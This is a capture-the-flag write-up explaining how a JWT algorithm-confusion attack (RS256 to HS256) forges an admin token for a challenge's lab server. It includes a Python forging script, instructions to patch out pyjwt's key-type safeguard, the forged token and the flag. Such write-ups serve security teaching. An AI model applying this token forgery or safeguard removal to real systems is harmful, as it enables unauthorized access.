# Unlock Me (905 Points) - 22 Solves (Cat 3)

```
Our agents discovered COViD's admin panel! They also stole the credentials minion:banana, but it seems that the user isn't allowed in. Can you find another way?

Admin Panel (http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/)
```

When we visit the site, we are greeted a login page. However, when we try to key in the credentials `minion:banana` to login, we get a message `Only admins are allowed into HQ!` 

![1.jpg](1.jpg)

Let's take a look at the `Page Source` javascript to see what exactly is going on:

```javascript
$( "#signinForm" ).submit(function( event ) {
  event.preventDefault();
  fetch("login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({"username": $( "#inputUsername" ).first().val(), "password": $( "#inputPassword" ).first().val() })
  }).then(function(response) {
    return response.json();
  }).then(function(data) {
    if (data.error) {
      $('#alerts').html('<div class="alert alert-danger" role="alert">'+data.error+'</div>');
    } else {
      fetch("unlock", {
        headers: {
          "Authorization": "Bearer " + data.accessToken
        }
      }).then(function(response) {
        return response.json();
      }).then(function(data) {
        if (data.error) {
          $('#alerts').html('<div class="alert alert-danger" role="alert">'+data.error+'</div>');
        } else {
          $('#alerts').html('<div class="alert alert-success" role="alert">'+data.flag+'</div>');
        }
      }).catch(function(error) {
        $('#alerts').html('<div class="alert alert-danger" role="alert">Request failed.</div>');
      })
    }
  }).catch(function(error) {
    $('#alerts').html('<div class="alert alert-danger" role="alert">Request failed.</div>');
  })
});
// TODO: Add client-side verification using public.pem
```

So what the page is basically doing is:

1. Sends a POST request to the `login` with the credentials when the form is submitted
2. Gets the response, and then sends an `accessToken` to another `unlock` endpoint via GET
3. If the response `data.error` is false, then we will be given the flag (`data.flag`)

Looking at the response for step 2 in `Network` of Chrome Developer Tools:

```json
{error: "Only admins are allowed into HQ!"}
```

Hmmm, so it seems like the `accessToken` we are getting is... invalid? Let's take a look at it:

```json
{accessToken: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NDMxMjY5fQ.QU38nbgiNtZdAgdzN5nqGmrqRt4QrkwKOLVXq27bOBX8zg7xFl09oM55qvZjD0sEOaQybiEauujlGH8mFKVvX-jcq1qSd8Z_MZkmi7T8VKFke8SFoxqhuNAo7d34md18p8jzHb4_7rdit5JOPjRvv0h5BikECqWuOWT2M07LDti7FNPitWkLd1Iv1UxnyC5ODfa5tCRyuj6rzH3oz7xdln2VBjftlwy9ZO1h-u8dY9kvMLdB6pEg2abM9-B7iopqHlRB93ceoKEgBFIihmwnGmlCat783_Iy5ibD1K0pmIMdHIf5ymoBfP5K8gGj7_seRI_XicvWT3bDW0XuKTAoO4_KPoKgAp7FJ3EhOoIBqeTkVmPygWssxcmderIuXBsnW3OCBnsDAyGANienUiQGjGGN00yGEcnCMk2v2HYGGfhCcRC5bhrmYCR_CDiVD2TvadQSngd8rrIh6EaDmyZ6w_DF7QG56-wuFIJLP99icUT_WZl82vuiN2cn4jbLCA4OihbZX-Kak0u5WzJ1l9VjuC94vITEJXypesOxgG_1rVUQr-IWRKRxTYw4QuqEJ2dlBW9WLgwHCYCPNe5_RUcrnY18azP1m4kt_g4RTI-NXcMBv_-ahwgepFuPSEC5Wx_EjFjRQj1_keilS6QA0mZt6w-pmVlN3enMJ-SLRek9tmk"}
```

Now, that looks oddly like a **JWT (JSON Web Token)**!

Let's put it into `jwt.io` to look at its contents:

![](2.jpg)

Aha! It seems like in the token, our role is only a `user`, but as we know **only admins can login**.

Now we can easily change the role value to "admin", but we will have to **resign the token(AccessCode) with a new signature** if not it will be invalid. *How will we do that?*  

When we relook at the page source, we noticed this HTML comment:

```html
// TODO: Add client-side verification using public.pem
```

Visiting the path `/public.pem` gives us a download of a public key.

Could it be the [RS256 => HS256 algorithm](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6) exploit? The **public key is necessary for this exploit to work**.

This exploit works by converting the algorithm used by the token from `RS256` to `HS256`. 

- RS256 is an **asymmetric algorithm**, which means that it uses a **private key** to **sign the signature**, and a **public key** to **verify the signature (for authentication)**.
- HS256 is a **symmetric algorithm**, which means that it uses the **same secret/key** to **sign and verify the signature**
- **If the backend accepts both HS256 AND RS256** as the algorithms accepted, when we change the algorithm from RS256 to HS256, the **backend treats the <u>known public key as the secret/key for HS256</u>**.
- Hence, we can **modify the token** and **sign it using the public key** for the **backend to accept the token using the HS256 algorithm**.



Therefore, let's first modify the payload to what we want:

```json
{
  "username": "minion",
  "role": "admin",
  "iat": 1607431269
}
```

We can then script a quick python script using the `pyjwt` library to sign our modified token:

```python
import jwt
encoded = jwt.encode({
  "username": "minion",
  "role": "admin",
  "iat": 1607431269
}, open("public.pem").read(), algorithm='HS256')
print(encoded)
```

**<u>Note:</u>** The Pyjwt library will try to stop you in order to protect the user, so you will have to modify the `<PYTHON DIR>\lib\site-packages\jwt\algorithms.py` file by commenting the following lines: (*line 150*)

```python
if any([string_value in key for string_value in invalid_strings]):
  raise InvalidKeyError(
    'The specified key is an asymmetric key or x509 certificate and'
    ' should not be used as an HMAC secret.')
```

and we will get our modified JWT :smile::

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQzMTI2OX0.5cEY1Z0ZIu9zUokJEyiyiKPbmTb7jU49vCzzhnI8Pe0
```

Sending this to the `unlock` endpoint (with `GET`) with the header `Authorization: Bearer + <Modified JWT> `:

![](3.jpg)

Bingo! Hence we get the flag:

```
govtech-csg{5!gN_0F_+h3_T!m3S}
```

